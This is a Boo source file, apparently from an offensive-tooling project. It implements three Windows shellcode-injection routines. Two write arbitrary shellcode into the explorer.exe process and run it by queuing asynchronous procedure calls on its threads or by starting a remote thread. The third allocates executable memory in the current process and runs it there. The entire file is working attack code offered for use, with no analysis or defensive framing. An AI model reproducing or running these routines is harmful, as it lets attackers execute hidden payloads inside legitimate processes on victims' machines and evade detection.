import System.Runtime.InteropServices
from System.Diagnostics import Process
from System import IntPtr

/*
Author: Marcello Salvati (@byt3bl33d3r)
License: BSD 3-Clause

This Boolang source file can be run directly with the booi.exe interpreter or using the embedded compiler in runBoo.cs/Invoke-JumpScare.ps1

References:
- https://github.com/boo-lang/boo/wiki/Scripting-with-the-Boo.Lang.Compiler-API
- https://github.com/boo-lang/boo/wiki/Invoke-Native-Methods-with-DllImport
- https://github.com/pwndizzle/c-sharp-memory-injection
*/

class Inject:

    [DllImport("kernel32.dll")]
    def OpenProcess(dwDesiredAccess as int, bInheritHandle as bool, dwProcessID as int) as int:
        pass

    [DllImport("kernel32.dll")]
    def VirtualAllocEx(hProcess as int, lpAddress as int, dwSize as int, flNewProtect as uint, lpflOldProtect as uint) as int:
        pass

    [DllImport("kernel32.dll")]
    def VirtualProtectEx(hProcess as int, lpAddress as int, dwSize as int, flNewProtect as uint, lpflOldProtect as uint) as bool:
        pass

    [DllImport("kernel32.dll")]
    def WriteProcessMemory(hProcess as int, lpBaseAddress as int, lpBuffer as (byte), nSize as int, lpNumberOfBytesWritten as int) as bool:
        pass

    [DllImport("kernel32.dll")]
    def OpenThread(dwDesiredAccess as int, bInheritHandle as bool, dwThreadId as int) as int:
        pass

    [DllImport("kernel32.dll")]
    def QueueUserAPC(pfnAPC as int, hThread as int, dwData as int) as int:
        pass

    [DllImport("kernel32.dll")]
    def VirtualAlloc(lpStartAddr as int, size as int, flAllocationType as uint, flProtect as uint) as int:
        pass

    [DllImport("kernel32.dll")]
    def CreateThread(lpThreadAttributes as int, dwStackSize as int, lpStartAddress as int, param as int, dwCreationFlags as int, lpThreadId as int) as int:
        pass

    [DllImport("kernel32.dll")]
    def CreateRemoteThread(hProcess as int, lpThreadAttributes as int, dwStackSize as uint, lpStartAddress as int, lpParameter as int, dwCreationFlags as uint, lpThreadId as int) as int:
        pass

    [DllImport("kernel32.dll")]
    def WaitForSingleObject(hHandle as int, dwMilliseconds as long):
        pass

    public static def InjectQueueUserAPC(sc as (byte)):
        # Process Privileges
        PROCESS_VM_OPERATION = 0x0008 cast int
        PROCESS_VM_WRITE = 0x0020 cast int
        PROCESS_VM_READ = 0x0010 cast int

        # Memory Permissions
        MEM_COMMIT = 0x1000 cast uint
        PAGE_EXECUTE_READWRITE = 0x40 cast uint
        PAGE_EXECUTE_READ = 0x20 cast uint

        # Thread Permissions
        SUSPEND_RESUME = (0x0002) cast int
        GET_CONTEXT = (0x0008) cast int
        SET_CONTEXT = (0x0010) cast int
        THREAD_HIJACK =  SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT

        targetProcess = Process.GetProcessesByName("explorer")[0]
        procHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id)
        print "procHandle = $procHandle"

        resultPtr = VirtualAllocEx(procHandle cast IntPtr, 0, sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        print "resultPtr = $resultPtr"

        bytesWritten as int = 0;
        resultBool = WriteProcessMemory(procHandle cast IntPtr, resultPtr cast IntPtr, sc, sc.Length, bytesWritten)
        print "WriteProcessMemory = $resultBool, bytesWritten = $bytesWritten"

        oldProtect as uint = 0
        resultBool = VirtualProtectEx(procHandle cast IntPtr, resultPtr cast IntPtr, sc.Length, PAGE_EXECUTE_READ, oldProtect)
        print "VirtualProtectEx = $resultBool, oldProtect = $oldProtect"

        for thread in targetProcess.Threads:
            tHandle = OpenThread(THREAD_HIJACK, false, thread.Id cast int)
            print "tHandle = $tHandle"

            ptr = QueueUserAPC(resultPtr cast IntPtr, tHandle, 0)
            print "QueueUserAPC = $ptr"

        print "Injected"

    public static def InjectSelf(sc as (byte)):
        MEM_COMMIT = 0x1000 cast uint
        PAGE_EXECUTE_READWRITE = 0x40 cast uint

        currentProcess = Process.GetCurrentProcess()
        threadId = 0
        pinfo = 0

        funcAddr = VirtualAlloc(0, sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        print "funcAddr = $funcAddr"
        Marshal.Copy(sc, 0 , funcAddr cast IntPtr, sc.Length)

        //oldProtect as uint = 0
        //resultBool = VirtualProtectEx(currentProcess.Handle cast IntPtr, funcAddr cast IntPtr, sc.Length, PAGE_EXECUTE_READWRITE, oldProtect)
        //print "VirtualProtectEx = $resultBool, oldProtect = $oldProtect"

        hThread = CreateThread(0, 0, funcAddr, pinfo, 0 ,threadId)
        print "hThread = $hThread"
        WaitForSingleObject(hThread, 0xFFFFFFFF)
        print "Injected"

    public static def InjectRemote(sc as (byte)):
        # Process Privileges
        PROCESS_VM_OPERATION = 0x0008 cast int
        PROCESS_VM_WRITE = 0x0020 cast int
        PROCESS_VM_READ = 0x0010 cast int
        PROCESS_ALL = 0x1F0FFF cast int

        # Memory Permissions
        MEM_COMMIT = 0x1000 cast uint
        PAGE_EXECUTE_READWRITE = 0x40 cast uint

        targetProcess = Process.GetProcessesByName("explorer")[0]
        procHandle = OpenProcess(PROCESS_ALL, false, targetProcess.Id)
        print "procHandle = $procHandle"

        resultPtr = VirtualAllocEx(procHandle cast IntPtr, 0, sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        print "resultPtr = $resultPtr"

        bytesWritten as int = 0;
        resultBool = WriteProcessMemory(procHandle cast IntPtr, resultPtr cast IntPtr, sc, sc.Length, bytesWritten)
        print "WriteProcessMemory = $resultBool, bytesWritten = $bytesWritten"

        CreateRemoteThread(procHandle cast IntPtr, 0, 0, resultPtr cast IntPtr, 0, 0, 0)
        print "Injected"
